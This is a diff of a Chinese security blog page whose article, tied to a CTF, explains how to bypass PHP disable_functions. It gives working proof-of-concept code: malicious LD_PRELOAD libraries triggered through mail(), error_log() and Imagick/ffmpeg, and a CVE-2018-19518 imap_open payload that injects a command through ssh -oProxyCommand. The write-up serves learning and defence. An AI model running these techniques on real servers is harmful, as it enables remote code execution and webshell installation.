@@ -6,15 +6,37 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | Hexo</title>
+  <title>Bypass-disabled_functions一些思路总结 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+  <meta name="description" content="文章首发于先知社区https://xz.aliyun.com/t/4623  简介PHP 的 disabled_functions主要是用于禁用一些危险的函数防止被一些攻击者利用 Bypass思路利用LD_PRELOAD什么是LD_PRELOAD1LD_PRELOAD是Linux系统的一个环境变量，用于动态库的加载，动态库加载的优先级最高，它可以影响程序的运行时的链接（Runtime linke">
+<meta name="keywords" content="一些姿势">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bypass-disabled_functions一些思路总结">
+<meta property="og:url" content="http://yoursite.com/2019/05/01/Bypass-disabled-functions一些思路总结/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="文章首发于先知社区https://xz.aliyun.com/t/4623  简介PHP 的 disabled_functions主要是用于禁用一些危险的函数防止被一些攻击者利用 Bypass思路利用LD_PRELOAD什么是LD_PRELOAD1LD_PRELOAD是Linux系统的一个环境变量，用于动态库的加载，动态库加载的优先级最高，它可以影响程序的运行时的链接（Runtime linke">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330005303-1e7ffcda-5243-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330011754-96d9fcb4-5246-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330023106-d0f82628-5250-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330013011-4deed608-5248-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330030422-76438ea2-5255-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330025044-8eb6eefe-5253-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330030223-2f5a5796-5255-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330030310-4b46e942-5255-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330090346-ab7e1f1a-5287-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330121909-f6e6dfbc-52a2-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330122537-de3708b0-52a3-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330122857-55adcbd6-52a4-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330123601-52125e32-52a5-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330131614-f0c0b768-52aa-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330100258-f0e06182-528f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330134911-8ad0aa9e-52af-1.png">
+<meta property="og:updated_time" content="2019-05-01T04:52:32.074Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hexo">
+<meta name="twitter:title" content="Bypass-disabled_functions一些思路总结">
+<meta name="twitter:description" content="文章首发于先知社区https://xz.aliyun.com/t/4623  简介PHP 的 disabled_functions主要是用于禁用一些危险的函数防止被一些攻击者利用 Bypass思路利用LD_PRELOAD什么是LD_PRELOAD1LD_PRELOAD是Linux系统的一个环境变量，用于动态库的加载，动态库加载的优先级最高，它可以影响程序的运行时的链接（Runtime linke">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190330005303-1e7ffcda-5243-1.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -144,78 +166,119 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-Bypass-disabled-functions一些思路总结" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/05/01/运用Scapy编写类似于Nmap的端口扫描脚本/" class="archive-article-date">
-  	<time datetime="2019-05-01T02:18:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-01</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/05/01/运用Scapy编写类似于Nmap的端口扫描脚本/">运用Scapy编写类似于Nmap的端口扫描脚本</a>
+    <h1 class="article-title" itemprop="name">
+      Bypass-disabled_functions一些思路总结
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">工具</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/05/01/Bypass-disabled-functions一些思路总结/" class="archive-article-date">
+        
+        <a href="/2019/05/01/Bypass-disabled-functions一些思路总结/" class="archive-article-date">
   	<time datetime="2019-05-01T02:17:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-01</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/05/01/Bypass-disabled-functions一些思路总结/">Bypass-disabled_functions一些思路总结</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>文章首发于先知社区<a href="https://xz.aliyun.com/t/4623" target="_blank" rel="noopener">https://xz.aliyun.com/t/4623</a></p>
+</blockquote>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>PHP 的 disabled_functions主要是用于禁用一些危险的函数防止被一些攻击者利用</p>
+<h1 id="Bypass思路"><a href="#Bypass思路" class="headerlink" title="Bypass思路"></a>Bypass思路</h1><h2 id="利用LD-PRELOAD"><a href="#利用LD-PRELOAD" class="headerlink" title="利用LD_PRELOAD"></a>利用LD_PRELOAD</h2><p>什么是LD_PRELOAD<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD是Linux系统的一个环境变量，用于动态库的加载，动态库加载的优先级最高，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</span><br></pre></td></tr></table></figure></p>
+<p>简单来说就是<code>LD_PRELOAD</code>指定的动态链接库文件，会在其它文件调用之前先被调用</p>
+<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>光看概念估计你可能会很懵，我们来写一个简单的demo来了解一下啥是<code>LD_PRELOAD</code><br>首先我们先写一个id.c，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line"></span><br><span class="line">uid_t geteuid( void ) &#123; return 0; &#125;</span><br><span class="line">uid_t getuid( void ) &#123; return 0; &#125;</span><br><span class="line">uid_t getgid( void ) &#123; return 0; &#125;</span><br></pre></td></tr></table></figure></p>
+<p>执行一波<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">qiyou@ubuntu:~/Desktop$ id</span><br><span class="line">uid=1000(qiyou) gid=1000(qiyou) groups=1000(qiyou)....</span><br><span class="line"></span><br><span class="line">qiyou@ubuntu:~$ whoami</span><br><span class="line">qiyou</span><br><span class="line"></span><br><span class="line">qiyou@ubuntu:~/Desktop$ gcc -shared -o id.so id.c</span><br><span class="line"></span><br><span class="line">qiyou@ubuntu:~/Desktop$ export LD_PRELOAD=./id.so</span><br><span class="line"></span><br><span class="line">qiyou@ubuntu:~/Desktop$ id</span><br><span class="line">uid=0(root) gid=0(root) egid=1000(qiyou)....</span><br><span class="line"></span><br><span class="line">qiyou@ubuntu:~/Desktop$ whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure></p>
+<p>可以看到uid和gid都变为了0，权限也变为了root</p>
+<p>我们可以用ldd查询一下依赖关系，可以发现id.so(我们编译的动态链接库)在其它动态链接库之前提前被加载了，也就是说我们的恶意代码中的函数覆盖了原本的动态链接库的函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330005303-1e7ffcda-5243-1.png" alt="image.png"></p>
+<h3 id="配合putenv-mail"><a href="#配合putenv-mail" class="headerlink" title="配合putenv+mail"></a>配合putenv+mail</h3><p>putenv官方手册是这么解释的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">putenv ( string $setting ) : bool</span><br><span class="line">添加setting到服务器环境。环境变量仅在当前请求的持续时间内存在。在请求结束时，环境将恢复到其原始状态。</span><br></pre></td></tr></table></figure></p>
+<p>如果该函数未被ban掉的话，即使是禁用了其它常见的函数，也可能会导致rce<br>我们可以按照如下步骤：</p>
+<ol>
+<li>生成一个我们的恶意动态链接库文件</li>
+<li>利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径</li>
+<li>配合php的某个函数去触发我们的恶意动态链接库文件</li>
+<li>Getshell</li>
+</ol>
+<p>那么php中的某个函数怎么去找呢，参考了<a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" title="该文章" target="_blank" rel="noopener">该文章</a>，发现mail()函数可以使用，而mail()函数执行默认是会调用外部程序sendmail的，看一下php.ini就会发现默认调用<code>sendmail -t -i</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330011754-96d9fcb4-5246-1.png" alt="image.png"></p>
+<blockquote>
+<p>PS：如果没有安装sendmail的话可以用<code>apt-get install sendmail</code>安装sendmail</p>
+</blockquote>
+<p>我们可以用strace查看一下mail函数调用的过程，可以很明显看出来执行了<code>sendmail -t -i</code><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330023106-d0f82628-5250-1.png" alt="image.png"></p>
+<p>然后我们可以使用 <code>readelf -Ws /usr/sbin/sendmail</code> 可以查看senmail都调用了哪一些函数，然后从中选几个即可，这里我们选择<code>getuid</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330013011-4deed608-5248-1.png" alt="image.png"><br>然后就可以编写我们的动态连接程序<br>test.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void payload() &#123;</span><br><span class="line">        system(&quot;ls &gt; test&quot;);</span><br><span class="line">&#125;   </span><br><span class="line">int  geteuid() &#123;</span><br><span class="line">if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;</span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后生成我们的动态链接程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC test.c -o test</span><br><span class="line">gcc --share test -o test.so</span><br></pre></td></tr></table></figure></p>
+<p>然后编写php脚本mail.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD=./test.so&quot;);</span><br><span class="line">mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>执行一波，然后用strace查看调用过程是否执行了我们的<code>ls &gt; test</code>，可以发现成执行了我们的命令</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330030422-76438ea2-5255-1.png" alt="image.png"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330025044-8eb6eefe-5253-1.png" alt="image.png"></p>
+<h3 id="配合putenv-error-log"><a href="#配合putenv-error-log" class="headerlink" title="配合putenv+error_log"></a>配合putenv+error_log</h3><p>0ctf2019的<code>Wallbreaker Easy</code>中ban了mail函数，但是<code>error_log</code>没有ban掉，故我们可以用<code>error_log</code>来bypass disabled_functions</p>
+<p>error_log的一些参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">error_log(error,type,destination,headers)</span><br><span class="line"></span><br><span class="line">当type为1时，服务器就会把error发送到参数 destination 设置的邮件地址</span><br></pre></td></tr></table></figure></p>
+<p>编写php脚本，动态链接文件同上，error_log调用的过程中（当type为1时）和mail函数一样，也会调用sendmail，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD=./test.so&quot;);</span><br><span class="line">error_log(&quot;test&quot;,1,&quot;&quot;,&quot;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330030223-2f5a5796-5255-1.png" alt="image.png"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330030310-4b46e942-5255-1.png" alt="image.png"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330090346-ab7e1f1a-5287-1.png" alt="image.png"></p>
+<h2 id="利用ImageMagick"><a href="#利用ImageMagick" class="headerlink" title="利用ImageMagick"></a>利用ImageMagick</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这个搭建环境有一丝丝繁琐，不过没关系，按照我以下步骤来应该问题不大QAQ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1：apt-get update&amp;&amp;apt-get install imagemagick</span><br><span class="line">2：convert -version //如果安装成功会返回imagemagick版本号</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330121909-f6e6dfbc-52a2-1.png" alt="image.png"></p>
+<p>安装几个依赖<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php-pear php-dev</span><br><span class="line">apt-get install libmagickwand-dev</span><br></pre></td></tr></table></figure></p>
+<p>下载以及安装imagick<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.wget http://pecl.php.net/get/imagick-3.4.3.tgz</span><br><span class="line"></span><br><span class="line">2.tar -zxvf imagick-3.4.3.tgz</span><br><span class="line"></span><br><span class="line">3.phpize</span><br><span class="line"></span><br><span class="line">4.  ./configure --with-php-config=/usr/bin/php-config --with-imagick=/usr/local/imagemagick //注意php-config可能会不同，要根据你具体的情况来修改</span><br><span class="line"></span><br><span class="line">5.make&amp;&amp;make install</span><br><span class="line"></span><br><span class="line">6.改一波php.ini，随便一行添加：extension = imagick.so</span><br><span class="line"></span><br><span class="line">7.然后php -r &quot;phpinfo();&quot;|grep imagick，看有没有安装成功</span><br></pre></td></tr></table></figure></p>
+<p>成功安装<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330122537-de3708b0-52a3-1.png" alt="image.png"></p>
+<p>然后安装ffmpeg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ffmpeg</span><br><span class="line">ffmpeg -v 看看是否安装成功</span><br></pre></td></tr></table></figure></p>
+<p>成功安装<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330122857-55adcbd6-52a4-1.png" alt="image.png"></p>
+<h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p>那么我们应该如何利用呢，参考了飘零师傅的分析，可以知道当Imagick处理的文件是如下后缀的时候，就会调用外部程序ffmpeg去处理该文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmv,mov,m4v,m2v,mp4,mpg,mpeg,mkv,avi,3g2,3gp</span><br></pre></td></tr></table></figure></p>
+<p>我们来写一个小demo来验证一下是否正确<br>img.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$img = new Imagick(&apos;img.mp4&apos;); //img.mp4文件必须存在，否则就会不去调用ffmpeg</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>我们strace一下看看执行的过程，可以发现在执行的过程中调用了ffmpeg</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330123601-52125e32-52a5-1.png" alt="image.png"></p>
+<h3 id="配合-attribute-函数"><a href="#配合-attribute-函数" class="headerlink" title="配合__attribute__函数"></a>配合<code>__attribute__</code>函数</h3><p><strong> PS: <code>__attribute__</code>的介绍</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__attribute__可以设置函数属性(Function Attribute)、变量属性(Variable Attribute)和类型属性(Type Attribute)。__attribute__前后都有两个下划线，并且后面会紧跟一对原括弧，括弧里面是相应的__attribute__参数</span><br><span class="line"></span><br><span class="line">__attribute__语法格式为：__attribute__ ( ( attribute-list ) )</span><br><span class="line">若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。类似的，若函数被设定为destructor属性，则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。例如下面的程序：</span><br></pre></td></tr></table></figure></p>
+<p>我们可以知道当该函数为<code>__attribute__((__constructor__))</code>的时候，会在main（）函数执行之前被自动的执行<br>所以我们尝试构造poc.c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(&quot;ls &gt; test&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后生成我们的动态链接程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC poc.c -o poc</span><br><span class="line">gcc --share poc -o poc.so</span><br></pre></td></tr></table></figure></p>
+<p>img.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD=./poc.so&quot;);</span><br><span class="line">$img = new Imagick(&apos;img.mp4&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>运行一波，发现我们的命令执行成功了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330131614-f0c0b768-52aa-1.png" alt="image.png"></p>
+<h2 id="利用imap-open-CVE-2018-19518"><a href="#利用imap-open-CVE-2018-19518" class="headerlink" title="利用imap_open (CVE-2018-19518)"></a>利用imap_open (CVE-2018-19518)</h2><p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。<br>因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p>
+<p><strong> ssh的-oProxyCommand 参数 </strong><br>SSH 命令中用到了许多命令，其中我们可以使用 -o 参数来设置连接期间可用的各种选项。在建立SSH连接之前，我们可以设置 <code>ProxyCommand</code>参数，如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qiyou@ubuntu:~/test$ ls</span><br><span class="line"></span><br><span class="line">qiyou@ubuntu:~/test$ ssh -oProxyCommand=&quot;touch test.txt&quot; 192.168.1.123</span><br><span class="line"></span><br><span class="line">ssh_exchange_identification: Connection closed by remote host</span><br><span class="line"></span><br><span class="line">qiyou@ubuntu:~/test$ ls</span><br><span class="line">test.txt</span><br></pre></td></tr></table></figure></p>
+<p>可以发现即使是ssh连接失败了，但是命令还是执行了。</p>
+<p><code>CVE-2018-19518</code>的环境可以直接使用vulhub上的环境：<a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518" title="链接" target="_blank" rel="noopener">链接</a></p>
+<p>直接上poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$exp = &quot;echo test!test! &gt; /tmp/test&quot;;</span><br><span class="line">$base64_exp = base64_encode($exp);</span><br><span class="line">$server = &quot;x -oProxyCommand=echo\t$&#123;base64_exp&#125;|base64\t-d|sh&#125;&quot;;</span><br><span class="line">imap_open(&apos;&#123;&apos;.$server.&apos;:143/imap&#125;INBOX&apos;, &apos;&apos;, &apos;&apos;) or die(&quot;\n\nError: &quot;.imap_last_error());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>执行一波，可以发现执行成功了，要想写webshell的话直接把我们的exp改一下就ok了，这里就不多赘述了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330100258-f0e06182-528f-1.png" alt="image.png"></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>被0ctf锤哭了，膜RR师傅Orz，比赛的时候没有做出来，赛后没有时间复现，等到想要复现的时候环境已经关了，只能是本地复现了，顺便总结了一下。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330134911-8ad0aa9e-52af-1.png" alt="image.png"></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" title="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a><br><a href="https://www.jianshu.com/p/137ae1400337" title="https://www.jianshu.com/p/137ae1400337" target="_blank" rel="noopener">https://www.jianshu.com/p/137ae1400337</a><br><a href="https://blog.csdn.net/haoel/article/details/1602108" title="https://blog.csdn.net/haoel/article/details/1602108" target="_blank" rel="noopener">https://blog.csdn.net/haoel/article/details/1602108</a><br><a href="https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php" title="https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php" target="_blank" rel="noopener">https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php</a></p>
 
-        <div class="article-info info-on-right">
-          
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -227,259 +290,115 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/05/01/Bypass-disabled-functions一些思路总结/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/05/01/xss总结/" class="archive-article-date">
-  	<time datetime="2019-05-01T02:16:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-01</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2019/05/01/运用Scapy编写类似于Nmap的端口扫描脚本/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          运用Scapy编写类似于Nmap的端口扫描脚本
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/05/01/xss总结/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">xss总结</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
